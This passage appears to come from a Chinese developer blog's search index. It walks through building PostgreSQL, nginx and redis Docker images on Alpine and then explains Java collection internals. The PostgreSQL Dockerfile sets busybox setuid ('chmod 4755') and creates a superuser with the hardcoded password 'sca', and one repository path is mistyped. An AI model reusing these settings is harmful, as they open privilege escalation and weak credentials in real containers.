readline-dev &amp;&amp; \\ # 创建数据目录，pgsql的data会放在这个目录里面 mkdir /sca/data &amp;&amp; \\ # 赋予权限 chown -R $&#123;user&#125;:$&#123;user&#125; /sca &amp;&amp; \\ chmod 4755 /bin/busybox# 指定postgres用户USER $&#123;user&#125;# 传递初始化sql和脚本到/sca目录下COPY ./initdb.sql /scaCOPY ./data.sql /scaCOPY ./start.sh /sca# 暴露你的端口EXPOSE 8888# 注意这个-w，得要。CMD [ &quot;/sca/postgresql/bin/pg_ctl&quot;, &quot;-D&quot;, &quot;/sca/data&quot;, &quot;-w&quot;, &quot;start&quot; ] start.sh 12345678910111213141516171819202122232425262728293031323334#!/bin/shport=8888data=/sca/databinpath=/sca/postgresql/bin# 判断是否存在posegresql.conf 从而判断是否已经构建完初始化数据库if [ ! -f &quot;$&#123;data&#125;/postgresql.conf&quot; ];then # 调用initdb 构建初始化数据库 echo &quot;initdb begin&quot; $&#123;binpath&#125;/initdb -D $&#123;data&#125; echo 1 &gt; $&#123;data&#125;/.init echo &quot;initdb end&quot; fi# 导入初始化数据if [ -f &quot;$&#123;data&#125;/.init&quot; ];then echo &quot;start data install&quot; $&#123;binpath&#125;/pg_ctl -D $&#123;data&#125; -w start $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create role sca with superuser login password &#x27;sca&#x27;&quot; -d postgres $&#123;binpath&#125;/createdb -p$&#123;port&#125; --encoding=UTF8 --owner=sca -e sca # $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;create extension pgcrypto;&quot; -d sca $&#123;binpath&#125;/psql -Usca -dsca -p$&#123;port&#125; -a -f /sca/initdb.sql 1&gt;/dev/null $&#123;binpath&#125;/psql -Usca -dsca -p$&#123;port&#125; -a -f /sca/data.sql 1&gt;/dev/null $&#123;binpath&#125;/psql -p$&#123;port&#125; -c &quot;alter user sca with nosuperuser&quot; -d postgres rm -rf /sca/dbinit.sh rm -rf /sca/data.sql rm -rf /sca/initdb.sql rm -rf $&#123;data&#125;/.init $&#123;binpath&#125;/pg_ctl -D $&#123;data&#125; -m fast -w stop echo &quot;end data install&quot;fi# 启动pgsql，这里用pg_ctl会启动不了容器（原因不知，可能和进程有关）exec $&#123;binpath&#125;/postgres -D $&#123;data&#125; 构建镜像docker build -t fire-pgsql:v1.0.0 . 参考创建普通用户（无密码）：https://stackoverflow.com/questions/49955097/how-do-i-add-a-user-when-im-using-alpine-as-a-base-image","tags":["postgresql"],"categories":["dockerfile"]},{"title":"dockerfile基于alpine构建nginx镜像","path":"/2022/06/21/dockerfile基于alpine构建nginx镜像/","content":"坏境docker：20.10.10 nginx：1.18.0 alpine：3.16.0 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备nginx的源码包(版本直达)，也可以去nginx官网处自行下载对应的版本。 准备一个nginx.conf配置文件，里面主要包含了我们对nginx的一些配置，如下其中某些配置需要修改。 1daemon off ; 准备完之后文件里面内容如下 12345678╰─$ ls -altotal 2056drwxr-xr-x 6 guoying staff 192 Jun 22 10:07 .drwxr-xr-x 7 guoying staff 224 Jun 22 15:06 ..-rw-r--r-- 1 guoying staff 1219 Jun 20 23:25 Dockerfiledrwxr-xr-x 7 guoying staff 224 Jun 20 10:44 dist # 前端文件夹-rw-r--r-- 1 guoying staff 1039530 Apr 21 2020 nginx-1.18.0.tar.gz-rw-r--r-- 1 guoying staff 4820 Jun 20 22:44 nginx.conf #里面需要个daemon off; 编写Dockerfile这里直接展示整个dockerfile文件，已经对应的注释 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# build nginxFROM alpine:3.16.0WORKDIR /# 将源码包考入的镜像的根目录下ADD nginx-1.18.0.tar.gz /# 配置aliyun仓库RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories &amp;&amp; \\ # 更新apk apk update &amp;&amp; \\ # 安装必要依赖 apk add --no-cache --virtual .build-deps \\ gcc \\ libc-dev \\ make \\ openssl-dev \\ pcre-dev \\ zlib-dev \\ linux-headers \\ curl \\ gnupg \\ libxslt-dev \\ gd-dev \\ geoip-dev &amp;&amp; \\ # 开始编译nginx cd /nginx-1.18.0 &amp;&amp; \\ ./configure --prefix=/sca/nginx &amp;&amp; \\ make &amp;&amp; make install &amp;&amp; \\ # 删除不需要的文件以及缓存 rm -rf nginx-1.18.0.tar.gz &amp;&amp; \\ rm -rf nginx-1.18.0 &amp;&amp; \\ rm -rf /sca/nginx/html &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ # 移除apk的依赖 apk del .build-deps \\ gcc \\ pcre-dev \\ libc-dev \\ make \\ openssl-dev \\ zlib-dev \\ linux-headers \\ curl \\ gnupg \\ libxslt-dev \\ gd-dev \\ geoip-dev &amp;&amp; \\ # 重新安装运行时需要的依赖 apk add pcre-dev# cp html file to containerCOPY ./dist /sca/nginx/htmlCOPY ./nginx.conf /sca/nginx/conf/# 暴露80端口EXPOSE 80# add run command CMD [ &quot;/sca/nginx/sbin/nginx&quot; ] 构建镜像docker build -t fire-nginx:v1.0.0 .","tags":["nginx"],"categories":["dockerfile"]},{"title":"dockerfile基于alpine构建redis镜像","path":"/2022/06/21/dockerfile基于alpine构建redis镜像/","content":"前言记录一次自己通过dockerfile源码构建redis的血与泪，以及踩过的坑。 坏境docker：20.10.10 redis：5.0.14 alpine：3.16.0 准备先创建一个空的文件夹，创建一个Dokcerfile文件，注意D大些，f小写。 准备redis-5.0.14的源码包(5.0.14版本直达)，也可以去所有版本处自行下载对应的版本。 准备一个redis.conf配置文件，里面主要包含了我们对redis的一些配置，如下其中某些配置需要修改。 1daemonize no 准备完之后文件里面内容如下 1234567╰─$ ls -alhtotal 4040drwxr-xr-x 5 guoying staff 160B Jun 21 00:27 .drwxr-xr-x 7 guoying staff 224B Jun 21 22:44 ..-rw-r--r-- 1 guoying staff 901B Jun 21 01:07 Dockerfile-rw-r--r--@ 1 guoying staff 1.9M Jun 20 23:34 redis-5.0.14.tar.gz-rw-r--r-- 1 guoying staff 57K Jun 21 01:13 redis.conf 编写Dockerfile我们先想想整个dockerfile的步骤 1、首先得基于一个很小的系统（alpine） 1FROM alpine:3.16.0 2、准备好需要的文件（redis源码包），可以在镜像里面下载（太慢）也可以自行拷贝进去，这里选择拷贝进去。 1ADD redis-5.0.14.tar.gz / # 将同级目录的redis源码压缩包放入镜像中（压缩包会自行解压） 3、配置apk的源 12RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories 4、安装需要的依赖 12345678910RUN apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ # --no-cache表示不缓存 gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev # redis还需要其他依赖，在redis的本地deps目录下面RUN cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise 5、编译redis，指定编译的地址 12RUN cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install 6、删除编译时候需要运行时候不需要的依赖和多余文件 123456789RUN rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev 7、替换配置文件 并且 暴露端口 12COPY ./redis.conf /sca/redis/EXPOSE 6379 8、准备启动参数 1CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 这样我们整个dockerfile的文件就如下所示 1234567891011121314151617181920212223242526272829303132333435FROM alpine:3.16.0ADD redis-5.0.14.tar.gz /RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories RUN apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev # redis还需要其他依赖，在redis的本地deps目录下面RUN cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise RUN cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install RUN rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev COPY ./redis.conf /sca/redis/EXPOSE 6379CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 接下来我们执行docker build -t fire-redis:v1.1.0 . ，等若干分钟之后 好家伙345MB，这谁受得了，我们可以使用docker history b3cf3ac45ad1 (这个是IMAGE ID)查看镜像的制造过程 接下来我们准备对镜像进行瘦身，最主要的一个过程就是对RUN 合并，dockerfile文件如下 12345678910111213141516171819202122232425262728293031FROM alpine:3.16.0ADD redis-5.0.14.tar.gz /RUN echo &quot;http://mirrors.aliyun.com/alpine/v3.11/main&quot; &gt; /etc/apk/repositories &amp;&amp; \\ echo &quot;http://mirrors.aliyun.com/alpine/v3.11/community&quot; &gt;&gt; /etc/apk/r epositories &amp;&amp; \\ apk update &amp;&amp; \\ apk add --no-cache --virtual .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev &amp;&amp; \\ cd /redis-5.0.14/deps &amp;&amp; \\ make lua hiredis linenoise &amp;&amp; \\ cd /redis-5.0.14 &amp;&amp; \\ make PREFIX=/sca/redis install &amp;&amp; \\ rm -rf /redis-5.0.14 &amp;&amp; \\ rm -rf /var/lib/apk/* &amp;&amp; \\ rm -rf /tmp/* &amp;&amp; \\ apk del .build-deps \\ gcc \\ g++ \\ make \\ libffi-dev \\ openssl-dev COPY ./redis.conf /sca/redis/EXPOSE 6379CMD [ &quot;/sca/redis/bin/redis-server&quot;, &quot;/sca/redis/redis.conf&quot;] 可以看到大小有很大的缩减 这样子我们就已经制作好了一个redis的镜像，此时使用docker run -d -p 6379:6379 fire-redis:v1.1.1启动容器 常见错误错误1:no such file or directory 12345╰─$ docker build -t fire-nginx:v1.1.0 . 1 ↵[+] Building 0.1s (1/2) =&gt; [internal] load build definition from Dockerfile 0.0s =&gt; =&gt; transferring dockerfile: 2B 0.0sfailed to solve with frontend dockerfile.v0: failed to read dockerfile: open /var/lib/docker/tmp/buildkit-mount956713246/Dockerfile: no such file or directory 解决：Dockerfile写成了DockerFile，注意f小写。 参考https://blog.csdn.net/Struggle99/article/details/124684534","tags":["redis"],"categories":["dockerfile"]},{"title":"Java集合","path":"/2022/04/21/集合/","content":"Collection ListArrayListArrayList是一个Object数组实现的数据结构，线程不安全 默认初始化大小10 1234/** * Default initial capacity. */private static final int DEFAULT_CAPACITY = 10; add方法 12345678910111213141516171819202122232425262728private void add(E e, Object[] elementData, int s) &#123; if (s == elementData.length) // 当下标的长度等于数组长度时候 扩容 elementData = grow(); // 返回扩容后的数组 elementData[s] = e; size = s + 1;&#125;public boolean add(E e) &#123; // 在父类AbstractList中定义，表示被修改的次数，一般与iterator一起使用， // 当modCount与expectCount不一致时，抛出ConcurrentModificationException异常 modCount++; add(e, elementData, size); return true;&#125;public void add(int index, E element) &#123; rangeCheckForAdd(index); // 判断下标的合法性 index&gt;0 &amp;&amp; index &lt;= size modCount++; final int s; Object[] elementData; if ((s = size) == (elementData = this.elementData).length) elementData = grow(); // 扩容操作 System.arraycopy(elementData, index, elementData, index + 1, s - index); // 使用System.arraycopy分配一个新的数组地址，然后降旧的数据拷贝过来 elementData[index] = element; size = s + 1;&#125; grow方法 123456789101112private Object[] grow(int minCapacity) &#123; int oldCapacity = elementData.length; if (oldCapacity &gt; 0 || elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; // 新的数组长度=旧的数组长度+（新增的长度 和 就数组长度的二分之一 中的最大值） int newCapacity = ArraysSupport.newLength(oldCapacity, minCapacity - oldCapacity, /* minimum growth */ oldCapacity &gt;&gt; 1 /* preferred growth */); return elementData = Arrays.copyOf(elementData, newCapacity); &#125; else &#123; return elementData = new Object[Math.max(DEFAULT_CAPACITY, minCapacity)]; &#125; &#125; get方法 1234public E get(int index) &#123; Objects.checkIndex(index, size);//检查下标合法性 return elementData(index); //直接通过下标获取到数据 &#125; ArrayList用数组作为底层数据结构，线程不安全，在新增一个对象的时候，当长度=数组的长度，会进行扩容，将大小扩容到 (当前长度+Math.max(需要新增得长度, 当前长度/2))，扩容的时候，通过Arrays.copyOf()申请一个新的数组地址。当在获取对象的时候直接通过index下标来获取。 性能 查找：通过下标查找，时间复杂度O(1)；通过值查找，时间复杂度O(n)。 顺序插入：直接在最后通过下标获取到数组位置赋值，时间复杂度O(1)，当长度不够时需要扩容。 非顺序插入: 需要将插入位置的数据往后移动。 LinkedListLinkedList底层是采用链表来实现的，也是线程不安全的。 Node类如下 1234567891011private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; // next节点 Node&lt;E&gt; prev; // prev节点 Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123; this.item = element; this.next = next; this.prev = prev; &#125; &#125; 故得出一个结论 LinkedList是双向链表。 LinkedList插入的基本操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112/** * Links e as first element. */private void linkFirst(E e) &#123; final Node&lt;E&gt; f = first; final Node&lt;E&gt; newNode = new Node&lt;&gt;(null, e, f); first = newNode; if (f == null) last = newNode; else f.prev = newNode; size++; modCount++;&#125;/** * Links e as last element. */void linkLast(E e) &#123; final Node&lt;E&gt; l = last; final Node&lt;E&gt; newNode = new Node&lt;&gt;(l, e, null); last = newNode; if (l == null) first = newNode; else l.next = newNode; size++; modCount++;&#125;/** * Inserts element e before non-null Node succ. */void linkBefore(E e, Node&lt;E&gt; succ) &#123; // assert succ != null; final Node&lt;E&gt; pred = succ.prev; final Node&lt;E&gt; newNode = new Node&lt;&gt;(pred, e, succ); succ.prev = newNode; if (pred == null) first = newNode; else pred.next = newNode; size++; modCount++;&#125;/** * Unlinks non-null first node f. */private E unlinkFirst(Node&lt;E&gt; f) &#123; // assert f == first &amp;&amp; f != null; final E element = f.item; final Node&lt;E&gt; next = f.next; f.item = null; f.next = null; // help GC first = next; if (next == null) last = null; else next.prev = null; size--; modCount++; return element;&#125;/** * Unlinks non-null last node l. */private E unlinkLast(Node&lt;E&gt; l) &#123; // assert l == last &amp;&amp; l != null; final E element = l.item; final Node&lt;E&gt; prev = l.prev; l.item = null; l.prev = null; // help GC last = prev; if (prev == null) first = null; else prev.next = null; size--; modCount++; return element;&#125;/** * Unlinks non-null node x. */E unlink(Node&lt;E&gt; x) &#123; // assert x != null; final E element = x.item; final Node&lt;E&gt; next = x.next; final Node&lt;E&gt; prev = x.prev; if (prev == null) &#123; first = next; &#125; else &#123; prev.next = next; x.prev = null; &#125; if (next == null) &#123; last = prev; &#125; else &#123; next.prev = prev; x.next = null; &#125; x.item = null; size--; modCount++; return element;&#125; 查找操作 12345678910111213141516171819public E get(int index) &#123; checkElementIndex(index); return node(index).item; &#125;Node&lt;E&gt; node(int index) &#123; // 当index在前半边，从前往后找，当index在后半边，从后往前找。 if (index &lt; (size &gt;&gt; 1)) &#123; Node&lt;E&gt; x = first; for (int i = 0; i &lt; index; i++) x = x.next; return x; &#125; else &#123; Node&lt;E&gt; x = last; for (int i = size - 1; i &gt; index; i--) x = x.prev; return x; &#125; &#125; LinkedList是使用双向链表实现，故不存在扩容的说法。 插入：LinkedList提供了linkFirst、linkLast、linkBefore三种插入操作方便，当顺序插入时时间复杂度为O(1)，直接用linkFirst或者linkLast；当在中间固定位置进行插入时候需要先用node(index)定位到具体位置然后使用linkBefore进行插入，查找的时间复杂度为O(n)。 查找：因为LinkedList的链表实现，当查找第一个或者最后一个的时候，由于LinkedList里面有记录first和last的node，所以时间复杂度为O(1)，查找中间的时候会根据当前index在链表的前半位置（从first向后查找）还是后半位置（从last向前查找）来进行查找，时间复杂度为O(n)。 ArrayList和LinkedList比较 查询比较多：1、查找的是第一个或者最后一个的时候，ArrayList和LinkedList一样都是O(1)；2、查找中间元素的时候，ArrayList时间复杂度O(1)，LinkedList时间复杂度O(n)，选ArrayList。 插入比较多：1、顺序插入，LinkedList时间复杂度O(1)，ArrayList时间复杂度O(1)但是长度不够会进行扩容；2、其他位置插入的时候，LinkedList时间复杂度O(n)，ArrayList会进行数组的copy以及长度不够会进行扩容。 Vectorvector基本是对ArrayList的操作加了synchronized关键字，所以是线程安全的。 CopyOnWriteArrayList123final transient Object lock = new Object(); // 用来作为锁的对象private transient volatile Object[] array; // 真正存数据的地方 首先copyOnWriteArrayList会有一个final修饰的lock对象用来当做锁对象，每次进行set add等操作的时候会使用synchronized对这个lock对象进行加锁，然后copyOnWriteArrayList实现了Cloneable接口，主要为后面的clone做准备。 基本操作方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public E get(int index) &#123; return elementAt(getArray(), index);&#125;public E set(int index, E element) &#123; synchronized (lock) &#123; Object[] es = getArray(); E oldValue = elementAt(es, index); if (oldValue != element) &#123; es = es.clone(); es[index] = element; &#125; // Ensure volatile write semantics even when oldvalue == element setArray(es); return oldValue; &#125;&#125;public boolean add(E e) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; es = Arrays.copyOf(es, len + 1); es[len] = e; setArray(es); return true; &#125;&#125;public void add(int index, E element) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; if (index &gt; len || index &lt; 0) throw new IndexOutOfBoundsException(outOfBounds(index, len)); Object[] newElements; int numMoved = len - index; if (numMoved == 0) newElements = Arrays.copyOf(es, len + 1); else &#123; newElements = new Object[len + 1]; System.arraycopy(es, 0, newElements, 0, index); System.arraycopy(es, index, newElements, index + 1, numMoved); &#125; newElements[index] = element; setArray(newElements); &#125;&#125;public E remove(int index) &#123; synchronized (lock) &#123; Object[] es = getArray(); int len = es.length; E oldValue = elementAt(es, index); int numMoved = len - index - 1; Object[] newElements; if (numMoved == 0) newElements = Arrays.copyOf(es, len - 1); else &#123; newElements = new Object[len - 1]; System.arraycopy(es, 0, newElements, 0, index); System.arraycopy(es, index + 1, newElements, index, numMoved); &#125; setArray(newElements); return oldValue; &#125;&#125; 可以看到get方法是不加锁的，直接从类定义的array数组里面获取值，而add set remove等方法都需要先进行加锁，然后对原先的array数组clone出来一个新的数组，对新数组进行操作，操作完成后赋值给array对象。 SetHashSet1234private transient HashMap&lt;E,Object&gt; map;// Dummy value to associate with an Object in the backing Mapprivate static final Object PRESENT = new Object(); HashSet底层实现使用HashMap，将值存放在HashMap的key里面，value是固定的PRESENT，利用了HashMap的key不重复作用实现了HashSet，所以HashSet是无序、不重复的。 LinkedHashSet代码里面只有四个构造器，调用父类HashSet的构造器，HashSet的实现变成LinkedHashMap，其余操作一致。 TreeSetTreeSet底层使用TreeMap。 QueuePriorityQueue优先级队列，内部采用数组实现平衡二叉堆，n的子节点为2n+1和2(n+1)。 几个重要的参数 1234567891011121314151617181920212223private static final int DEFAULT_INITIAL_CAPACITY = 11; /** * Priority queue represented as a balanced binary heap: the two * children of queue[n] are queue[2*n+1] and queue[2*(n+1)]. The * priority queue is ordered by comparator, or by the elements&#x27; * natural ordering, if comparator is null: For each node n in the * heap and each descendant d of n, n &lt;= d. The element with the * lowest value is in queue[0], assuming the queue is nonempty. */ transient Object[] queue; // non-private to simplify nested class access /** * The number of elements in the priority queue. */ int size; /** * The comparator, or null if priority queue uses elements&#x27; * natural ordering. */ @SuppressWarnings(&quot;serial&quot;) // Conditionally serializable private final Comparator&lt;? super E&gt; comparator; DelayQueue内部实现采用PriorityQueue和ReentrantLock以及Condition。 MapHashMapHashMap的底层采用数组+(链表或者红黑树)来实现，jdk1.7版本和1.8版本还有区别，这里只说1.8版本。 先来一张HashMap数据结构的图 我们先看一下它定义的默认值分别是什么意思。 1234567891011121314151617// 默认的初始化大小为16static final int DEFAULT_INITIAL_CAPACITY = 1 &lt;&lt; 4; // aka 16// 最大的容量大小 1&lt;&lt;30 = 2^30static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;// 默认的扩容因子0.75,达到容量0.75的时候进行扩容static final float DEFAULT_LOAD_FACTOR = 0.75f;// 链表转红黑树的长度static final int TREEIFY_THRESHOLD = 8;// 红黑树转链表的长度static final int UNTREEIFY_THRESHOLD = 6;// 转红黑树的table数组的最小长度static final int MIN_TREEIFY_CAPACITY = 64; HashMap类参数的定义 12345678910// Node的存储地方transient Node&lt;K,V&gt;[] table;// 存储数据的大小transient int size;// 操作的次数transient int modCount;// 需要扩容容量的大小，容量*扩容因子的值。int threshold;// 扩容因子final float loadFactor; Node节点的类参数定义 123456789101112131415161718192021222324252627282930313233343536static class Node&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final int hash; final K key; V value; Node&lt;K,V&gt; next; Node(int hash, K key, V value, Node&lt;K,V&gt; next) &#123; this.hash = hash; this.key = key; this.value = value; this.next = next; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final String toString() &#123; return key + &quot;=&quot; + value; &#125; public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value); &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (o == this) return true; return o instanceof Map.Entry&lt;?, ?&gt; e &amp;&amp; Objects.equals(key, e.getKey()) &amp;&amp; Objects.equals(value, e.getValue()); &#125;&#125; 分析一下其中主要的几个重要方法 put方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879public V put(K key, V value) &#123; // 获取key的hash值 return putVal(hash(key), key, value, false, true); &#125; /** * Implements Map.put and related methods. * * @param hash hash for key * @param key the key * @param value the value to put * @param onlyIfAbsent if true, don&#x27;t change existing value * @param evict if false, the table is in creation mode. * @return previous value, or null if none */ final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; // 如果table没初始化 或者 table的长度为0 if ((tab = table) == null || (n = tab.length) == 0) // 执行resize方法初始化table数组 n = (tab = resize()).length; // 如果 数组长度-1 逻辑与 key的hash 作为下标在数组中不存在 if ((p = tab[i = (n - 1) &amp; hash]) == null) // 直接生成新的Node放在table数组里面 tab[i] = newNode(hash, key, value, null); // 说明存在table并且table的对应下标位置有值了 else &#123; Node&lt;K,V&gt; e; K k; // p是table数组的对应下标Node，这里叫pNode // 如果（pNode的hash和key的hash相等）并且（两个的key地址相等 或者两个key equals），直接替换掉pNode。 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; // 如果pNode是树（红黑树）节点的话 else if (p instanceof TreeNode) // 直接调用putTreeVal存入 e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value); // 说明是链表的形式 else &#123; // 递归pNode的next节点 for (int binCount = 0; ; ++binCount) &#123; // 如果不存在next节点了，说明到低了 if ((e = p.next) == null) &#123; // 直接放在p.next节点 p.next = newNode(hash, key, value, null); // 如果binCount大于等于7（默认） 链表转换为为红黑树 // 实际也就是链表长度大于8的时候 进行转换 if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; &#125; // 如果（e的hash和key的hash相等）并且（两个的key地址相等 或者 两个key equals），退出当前循环 if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; &#125; &#125; // 如果存在e if (e != null) &#123; // existing mapping for key // 获取老数据 V oldValue = e.value; // 如果 存在既不插入 或者旧值为空，就赋值 if (!onlyIfAbsent || oldValue == null) e.value = value; // 接口类的方法，LinkedList会实现。 afterNodeAccess(e); return oldValue; &#125; &#125; ++modCount; // (长度+1)达到了需要扩容容量的大小的时候 进行resize扩容 if (++size &gt; threshold) resize(); // 接口类的方法，LinkedList会实现。 afterNodeInsertion(evict); return null; &#125; hash方法12345static final int hash(Object key) &#123; int h; // key的hashCode的高16位和低16位进行异或操作的值 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; get方法1234567891011121314151617181920212223242526272829public V get(Object key) &#123; Node&lt;K,V&gt; e; return (e = getNode(key)) == null ? null : e.value; &#125; final Node&lt;K,V&gt; getNode(Object key) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; int n, hash; K k; // table不为空 并且 table的大小大于0 并且 table的大小-1 逻辑与 key的hash() 不为空 if ((tab = table) != null &amp;&amp; (n = tab.length) &gt; 0 &amp;&amp; (first = tab[(n - 1) &amp; (hash = hash(key))]) != null) &#123; // 如果hash相同 并且（两个key地址相等或者equals）直接返回这个Node if (first.hash == hash &amp;&amp; // always check first node ((k = first.key) == key || (key != null &amp;&amp; key.equals(k)))) return first; // 如果当前Node的next节点不为空 if ((e = first.next) != null) &#123; // 如果当前节点是树节点，直接在通过红黑树的方法获取 if (first instanceof TreeNode) return ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key); // 反之则是链表，通过next节点一直往下寻找 do &#123; if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; &#125; while ((e = e.next) != null); &#125; &#125; return null; &#125; resize方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586final Node&lt;K,V&gt;[] resize() &#123; Node&lt;K,V&gt;[] oldTab = table; // 旧数组容量 int oldCap = (oldTab == null) ? 0 : oldTab.length; // 旧扩容阈值 int oldThr = threshold; // 新的数组容量和扩容阈值 int newCap, newThr = 0; // 旧数组容量&gt;0 if (oldCap &gt; 0) &#123; // 旧数组容量&gt;=最大容量（1&lt;&lt;30） if (oldCap &gt;= MAXIMUM_CAPACITY) &#123; // 设置扩容阈值为最大的int threshold = Integer.MAX_VALUE; // 扩不了容了，直接返回旧table return oldTab; &#125; // 新数组容量扩容一倍 // 如果旧数组容量的两倍&lt;最大容量（1&lt;&lt;30）并且旧容量&gt;=默认的初始化容量（16）， else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) // 新扩容阈值 扩容一倍 newThr = oldThr &lt;&lt; 1; // double threshold &#125; else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else &#123;// // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; // 默认16 newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); // 默认16*0.75=12 &#125; if (newThr == 0) &#123; // 新扩容阈值为0的时候初始化 float ft = (float)newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ? (int)ft : Integer.MAX_VALUE); &#125; threshold = newThr; @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap]; table = newTab; if (oldTab != null) &#123; for (int j = 0; j &lt; oldCap; ++j) &#123; Node&lt;K,V&gt; e; if ((e = oldTab[j]) != null) &#123; oldTab[j] = null; if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; else if (e instanceof TreeNode) // 是树节点 调用红黑树的方法 ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap); else &#123; // preserve order // 链表节点的话 会将一个链表 分成两个链表，一个挂index，一个挂index+oldCap Node&lt;K,V&gt; loHead = null, loTail = null; Node&lt;K,V&gt; hiHead = null, hiTail = null; Node&lt;K,V&gt; next; do &#123; next = e.next; if ((e.hash &amp; oldCap) == 0) &#123; if (loTail == null) loHead = e; else loTail.next = e; loTail = e; &#125; else &#123; if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; &#125; &#125; while ((e = next) != null); if (loTail != null) &#123; loTail.next = null; newTab[j] = loHead; &#125; if (hiTail != null) &#123; hiTail.next = null; newTab[j + oldCap] = hiHead; &#125; &#125; &#125; &#125; &#125; return newTab;&#125; 链表转树和树转链表当链表长度&gt;8的时候 链表会转树，当树长度&lt;6的时候会转链表，那么为什么不设置成一个数呢 比如7？是为了避免转换的太频繁。 hash计算先获取key的hashCode(); 将key的hashCode高16位与自身进行异或操作，得到的值即为hash值 为什么要这么做？ 是为了扰动的均衡一点。 jdk1.7 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; // 先取key的hashCode再和hashSeed进行异或运算 h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4); &#125; jdk1.8 12345static final int hash(Object key) &#123; int h; // key的hashCode的高16位和低16位进行异或操作的值 return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 为什么从jdk1.7到1.8扰动次数变少？ 我觉得可能是扰动2次效果差不了多少并且操作次数还变少了。 